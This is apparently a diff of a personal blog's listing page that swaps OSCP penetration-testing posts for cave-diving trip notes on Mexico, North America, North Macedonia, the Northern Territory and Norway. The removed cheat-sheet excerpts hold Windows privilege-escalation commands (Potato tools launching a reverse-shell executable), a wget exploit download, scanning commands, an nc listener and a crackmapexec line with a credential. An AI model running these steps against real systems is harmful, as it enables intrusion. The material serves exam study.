@@ -179,14 +179,20 @@
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/oscp---authby---windows/">OSCP - Authby - Windows</a>
+          <a href="/posts/nohoch/">Nohoch</a>
         </h2>
         <div class="post-meta"></div>
 
         
           <span class="post-tags">
             
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            #<a href="/tags/diving/">diving</a>&nbsp;
+            
+            #<a href="/tags/caving/">caving</a>&nbsp;
+            
+            #<a href="/tags/personal/">personal</a>&nbsp;
+            
+            #<a href="/tags/trips/">trips</a>&nbsp;
             
           </span>
         
@@ -196,28 +202,42 @@
 
         <div class="post-content">
           
-            <h1 id="authby">Authby</h1>
-<p>These Windows are doing my absolute head in. I spent hours on this box the day before following a multiple walkthroughs to the letter and got nowhere. I and wound up feeling so frustrated at not receiving even an initial shell that I marked this box as &ldquo;Aborted&rdquo; and shut down for the night - I figured there was no point pushing on and to just move on to the next Windows box.</p>
+            <h1 id="about">About</h1>
+<hr>
+<h1 id="to-do">To Do</h1>
+<p>Diving
+Dry
+Photogrammetry</p>
+<h1 id="logged-dives">Logged Dives</h1>
+<h1 id="references">References</h1>
+<p>MNemo Data: NoHoch.tml
+KML Survey: Nohoch - KML.kml</p>
           
         </div>
 
         
            <div>
-            <a class="read-more button inline" href="/posts/oscp---authby---windows/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/nohoch/">[Read more]</a>
           </div>
         
       </article>
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/oscp---blackgate---linux/">OSCP - Blackgate - Linux</a>
+          <a href="/posts/north-america/">North America</a>
         </h2>
         <div class="post-meta"></div>
 
         
           <span class="post-tags">
             
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            #<a href="/tags/diving/">diving</a>&nbsp;
+            
+            #<a href="/tags/personal/">personal</a>&nbsp;
+            
+            #<a href="/tags/trips/">trips</a>&nbsp;
+            
+            #<a href="/tags/expeditions/">expeditions</a>&nbsp;
             
           </span>
         
@@ -227,146 +247,47 @@
 
         <div class="post-content">
           
-            <h1 id="blackgate">Blackgate</h1>
-<p>This is the first of the &ldquo;Hard&rdquo; machines I&rsquo;ve tackled, so I&rsquo;d been worried it may have been a major step up from what I&rsquo;d been doing previously. Surprisingly though, this was very much a case of googling and learning about a service I&rsquo;d never heard of (Redis), connecting to it to test a few commands, and then finding the version I was connected to had a well known RCE exploit and using it to achieve initial access!</p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/oscp---blackgate---linux/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/oscp---boolean---linux/">OSCP - Boolean - Linux</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <h1 id="boolean">Boolean</h1>
-<p>This was an absolute slog, and even the walkthroughs didn&rsquo;t help at the end. It was good to identify that BurpSuite would be used early on, but picking up and changing the &ldquo;confirmed&rdquo; element was tricky. Having the PHP reverse shell not work was incredibly frustrating too, but it was obvious something else would be needed when GoBuster wasn&rsquo;t showing where the uploaded files were being stored (obviously download only and not directly web accessible).</p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/oscp---boolean---linux/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/oscp---cheat-sheet---active-directory/">OSCP - Cheat Sheet - Active Directory</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-            #<a href="/tags/oscp/">oscp</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <p><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology">HackTricks - AD Methodology</a></p>
-<h1 id="initial-access">Initial Access</h1>
+            <h1 id="about">About</h1>
+<p><a href="/posts/texas/">Texas</a>
+<a href="/posts/tennessee/">Tennessee</a>
+<a href="/posts/arkansas/">Arkansas</a>
+<a href="/posts/pacific-north-west/">Pacific North-West</a> - US &amp; Canada</p>
+<h1 id="caves">Caves</h1>
 <ul>
-<li><code>whoami</code>, <code>whoami /all</code></li>
-<li><code>whoami /priv</code>
-<ul>
-<li>SeImpersonatePrivilege
-<ul>
-<li>Run <a href="https://github.com/CCob/SweetPotato">SweetPotato</a>
-<ul>
-<li><code>./sweetpotato.exe -a &quot;C:\Users\Public\revshell.exe&quot;</code></li>
-</ul>
-</li>
-<li><a href="https://github.com/itm4n/FullPowers">FullPowers tool</a></li>
-<li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">How to use potatoes</a> &amp; - <a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/privileges-abuse/seimpersonate/potatoes" title="Pre-compiled">Pre-compiled Potatoes</a></li>
-<li><a href="https://juggernaut-sec.com/seimpersonateprivilege/">How to use Juicy/Rogue Potato &amp; Printspoofer</a></li>
-<li><a href="https://github.com/itm4n/PrintSpoofer">Printspoofer - GitHub</a> <code>.\PrintSpoofer64.exe -i -c powershell.exe</code> <code>whoami</code></li>
-<li><a href="https://github.com/k4sth4/Juicy-Potato/tree/main">Juicy Potato - Github</a> <code>.\juicypotato.exe -l  -p c:\Users\tony\revshell.exe -t * -c &quot;{9E175B9C-F52A-11D8-B9A5-505054503030}&quot;</code></li>
-</ul>
-</li>
-<li>SEbackupPriv
-<ul>
-<li><a href="https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/">https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/</a></li>
-<li><a href="https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md">https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md</a></li>
-</ul>
-</li>
-<li>SeShutdownPrivilege
-<ul>
-<li>Can a startup process be modified? Then modify &amp; reboot</li>
-<li>Check service has <code>Auto</code>: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &lsquo;httpd&rsquo;}</li>
-<li>Reboot: <code>shutdown /r /t 0</code></li>
-</ul>
-</li>
-<li><a href="https://github.com/xct/SeManageVolumeAbuse">SeManageVolumePrivilege</a>
-<ul>
-<li><code>wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe</code></li>
 <li></li>
 </ul>
-</li>
-</ul>
-</li>
-<li><code>whoami /groups</code>,
+<h1 id="trips">Trips</h1>
 <ul>
-<li><code>net localgroup</code> or <code>Get-LocalGroup</code> (Existing groups)</li>
-<li><code>Get-LocalGroupMember groupname</code> (Inspect)</li>
+<li></li>
 </ul>
-</li>
-<li><code>systeminfo</code> (wiki build number)
-<ul>
-<li>Windows kernel exploits</li>
-</ul>
-</li>
-</ul>
-<p>More Initial Access</p>
+<hr>
+<h1 id="references">References</h1>
           
         </div>
 
         
            <div>
-            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---active-directory/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/north-america/">[Read more]</a>
           </div>
         
       </article>
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/oscp---cheat-sheet---core/">OSCP - Cheat Sheet - Core</a>
+          <a href="/posts/north-macedonia/">North Macedonia</a>
         </h2>
         <div class="post-meta"></div>
 
         
           <span class="post-tags">
             
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            #<a href="/tags/diving/">diving</a>&nbsp;
             
-            #<a href="/tags/oscp/">oscp</a>&nbsp;
+            #<a href="/tags/personal/">personal</a>&nbsp;
+            
+            #<a href="/tags/trips/">trips</a>&nbsp;
+            
+            #<a href="/tags/expeditions/">expeditions</a>&nbsp;
             
           </span>
         
@@ -376,59 +297,187 @@
 
         <div class="post-content">
           
-            <h1 id="pre-exam">Pre-Exam</h1>
-<ul>
-<li>Download the resources from the dedicated lab clients;</li>
-<li>Document your report as you go during the exam</li>
-<li>Do a practice exam!</li>
-</ul>
-<h1 id="setup">Setup</h1>
-<p>Create directories: <code>mkdir dc host1 host2</code></p>
-<ul>
-<li>Create sub directories: <code>mkdir enu loot files exploits</code>
-Setup hostnames: <code>sudo nano /etc/hosts</code> then add host/kali IPs</li>
-</ul>
-<h1 id="quick-reference">Quick Reference</h1>
-<ul>
-<li><code>sudo nmap -T5 -p- -v host1 -oN enu/host1.nmap</code></li>
-<li><code>sudo nmap -T5 -p80,443,1978-1980 -sCV -v host1 -oN enu/nmap-services.nmap</code></li>
-<li><code>gobuster dir -u http://host1 -w /usr/share/dirb/wordlists/common.txt | tee gobuster-p80.nmap</code></li>
-<li><code>usr/share/wordlists/rockyou.txt</code></li>
-<li><code>usr/share/wordlists/SecLists</code></li>
-<li><code>nc -nvlp 4444</code> <a href="https://gist.github.com/cmbaughman/c91f41ba7b2cf71106f1">NetCat Cheat Sheet</a></li>
-<li><a href="https://www.revshells.com/">https://www.revshells.com/</a></li>
-</ul>
-<h1 id="easy-wins">Easy wins</h1>
-<ul>
-<li>Linux: Capabilities, SUIDs/GUIDs, cronjobs, modifiable binaries running as root, out-of-date binaries, known-binary exploits, history files.</li>
-<li>Windows: Weak service permissions, Unquoted service paths, outdated binaries, scheduled tasks, custom</li>
-<li>Take breaks, and set timers: If you&rsquo;re not getting anywhere for more than half an hour, take a break. Get some fresh air, and you&rsquo;ll almost definitely think of a new idea.
-<ul>
-<li>Similarly, celebrate when you make progress! If you finish a machine its a good time for a rest</li>
-</ul>
-</li>
-<li>Regularly review the information you have for a machine - key services, known version numbers, and any known credentials.</li>
-<li>Document as you go - take screenshots of key moments in the machine, and of course when you read a proof file.</li>
-<li>Metasploit - pick the machine that you think you have the least chance of exploiting manually</li>
-</ul>
-<h1 id="general-tips">General Tips</h1>
-<ul>
-<li>xfreerdp can pass the hash to login</li>
-<li><code>runas /user:domain\username cmd.exe</code> (or rdp and open CMD as admin)</li>
-<li>Use the Kali directory: <strong>/usr/share/webshells</strong> for all your payloads.</li>
-<li>MSFVenom Shell code for Buffer Overflow <a href="https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/">https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/</a></li>
-<li>If it&rsquo;s running SSH, find/replace the id_rsa</li>
-<li><code>!/bin/bash</code></li>
-<li>SMB - <code>crackmapexec</code> show available shares: <code>crackmapexec smb 192.168.50.242 -u john -p &quot;dqsTwTpZPn#nL&quot; --shares</code></li>
-<li>Scanning UDP Ports for SNMP - <a href="https://infosecwriteups.com/why-you-should-always-scan-udp-ports-part-1-2-d8ee7eb26727">https://infosecwriteups.com/why-you-should-always-scan-udp-ports-part-1-2-d8ee7eb26727</a></li>
-</ul>
-<p><img src="https://johnjhacking.com/uploads/autonmap.png" alt=""></p>
+            <h1 id="about">About</h1>
+<p><a href="https://en.wikipedia.org/wiki/Matka_Canyon">Matka Canyon Caves</a> - <a href="https://www.facebook.com/groups/2218647744?multi_permalinks=10162120691602745&amp;hoisted_section_header_type=recently_seen">Facebook</a></p>
+<p>North Macedonia offers some intriguing caving opportunities, particularly for dry cave exploration, with limited—but potentially promising—cave diving potential. The country lies within the Dinaric karst region, which spans much of the western Balkans and is known for extensive limestone formations, karst plateaus, sinkholes, and underground rivers. Here&rsquo;s a breakdown of what you can expect:</p>
+<hr>
+<h3 id="dry-caving-opportunities"><strong>Dry Caving Opportunities</strong></h3>
+<p>North Macedonia is home to hundreds of known caves, many of which remain poorly explored. Some of the most significant include:</p>
           
         </div>
 
         
            <div>
-            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---core/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/north-macedonia/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/northern-territory/">Northern Territory</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/diving/">diving</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <p>Northern Territory is listed under <a href="/posts/oceania/">Oceania</a> in <a href="/posts/cave-regions/">Cave Regions</a>.</p>
+<h1 id="cave-regions">Cave Regions</h1>
+<ul>
+<li>No local cave regions listed yet.</li>
+</ul>
+<h1 id="caves--dive-sites">Caves &amp; Dive Sites</h1>
+<ul>
+<li>See the linked cave regions above.</li>
+</ul>
+<h1 id="backlinks">Backlinks</h1>
+<ul>
+<li><a href="/posts/cave-regions/">Cave Regions</a></li>
+<li><a href="/posts/diving/">Diving</a></li>
+</ul>
+<hr>
+<h1 id="existing-notes">Existing Notes</h1>
+<h1 id="about">About</h1>
+<ul>
+<li>Koolatong Sink Hole (East Arnhem Land)</li>
+<li><a href="https://www.trimixdivers.com/trimix5/?p=4897">Tolmer Falls</a></li>
+<li><a href="https://www.trimixdivers.com/trimix5/?p=4893">Pine Creek</a></li>
+<li>Katherine Hot Springs
+<ul>
+<li><a href="https://goo.gl/maps/MhUvcFrMCUJ8FWMD9">Katherine Hotsprings</a> <a href="https://www.trimixdivers.com/trimix5/?p=4889">TrimixDivers</a></li>
+<li><a href="https://www.trimixdivers.com/trimix5/?p=4885">Bitter Springs</a></li>
+<li><a href="https://www.trimixdivers.com/trimix5/?p=4891">Mataranka Springs</a> &amp; Rainbow Springs</li>
+<li><a href="https://ecos.csiro.au/tracing-the-source-of-the-mataranka-springs/">CSIRO - Tracing the source of the Mataranka Springs</a></li>
+</ul>
+<ul>
+<li>Dr Sebastien Lamontagne is a hydrogeologist who led the Mataranka Springs research</li>
+</ul>
+<ul>
+<li>Fed by Cambrian Limestone Aquifer with two inputs to Mataranka - &ldquo;Georgina&rdquo; &amp; &ldquo;Daly&rdquo;</li>
+</ul>
+</li>
+</ul>
+<h1 id="caves">Caves</h1>
+<ul>
+<li></li>
+</ul>
+<h1 id="trips">Trips</h1>
+<ul>
+<li></li>
+</ul>
+<hr>
+<h1 id="references">References</h1>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/northern-territory/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/norway/">Norway</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/diving/">diving</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <p>Norway is listed under <a href="/posts/europe/">Europe</a> in <a href="/posts/cave-regions/">Cave Regions</a>.</p>
+<h1 id="cave-regions">Cave Regions</h1>
+<ul>
+<li>No local cave regions listed yet.</li>
+</ul>
+<h1 id="caves--dive-sites">Caves &amp; Dive Sites</h1>
+<ul>
+<li>See the linked cave regions above.</li>
+</ul>
+<h1 id="backlinks">Backlinks</h1>
+<ul>
+<li><a href="/posts/cave-regions/">Cave Regions</a></li>
+<li><a href="/posts/diving/">Diving</a></li>
+</ul>
+<hr>
+<h1 id="existing-notes">Existing Notes</h1>
+<h1 id="about">About</h1>
+<ul>
+<li>Jani Santala - Black Duck Diving</li>
+<li>Orca Snorkelling in Lofoten</li>
+</ul>
+<p>Plura Cave in Rana, Norway, is accessible for diving year-round</p>
+<h1 id="caves">Caves</h1>
+<ul>
+<li>Jordbrugrotta Farm, <a href="https://ngdf.shorthandstories.com/?page_id=421&amp;lang=en#section-English-JQuw9Txawq">Plura</a> in Rana
+<ul>
+<li><a href="http://ngdf.no/?page_id=421&amp;lang=en">Plura Week</a> (Friday Week 31 to Friday Week 32), Organised by <a href="https://www.facebook.com/NorskGrottedykkerforbund/">NGDF</a>
+<ul>
+<li>Winter (December–March)
+<ul>
+<li>Vis ~100 meters</li>
+<li>Water temp: ~2°C</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li>Summer (July–August)</li>
+<li>Vis ~30-50m</li>
+<li>Water Temp: 4-7°C</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><a href="https://www.suunto.com/en-au/sports/News-Articles-container-page/Exploring-the-Litjaga-cave/">Litjåga cave</a></li>
+<li>Sagelva - <a href="https://vimeo.com/475236239">https://vimeo.com/475236239</a>
+<ul>
+<li>Much of the mountain in Nordland is porous limestone, which means that Nordland has several caves. One of those that has been explored recently is the Sagelv system in Salangen municipality</li>
+</ul>
+</li>
+<li>Røyrvik - <a href="https://vimeo.com/475236239">https://vimeo.com/475236239</a>
+<ul>
+<li>In Røyrvik, there are several caves that have been explored and are still being explored. The caves are shallow, and here it is nice to use side-mounted equipment.</li>
+</ul>
+</li>
+<li>Dumdalen - <a href="https://www.youtube.com/watch?v=U1c83mvyRH8">https://www.youtube.com/watch?v=U1c83mvyRH8</a></li>
+</ul>
+<h1 id="trips">Trips</h1>
+<ul>
+<li></li>
+</ul>
+<hr>
+<h1 id="references">References</h1>
+<p><a href="https://balticcirclediving.com/">Baltic Circle Diving tour</a> (May-Sept 2019) Tiff Norberg</p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/norway/">[Read more]</a>
           </div>
         
       </article>
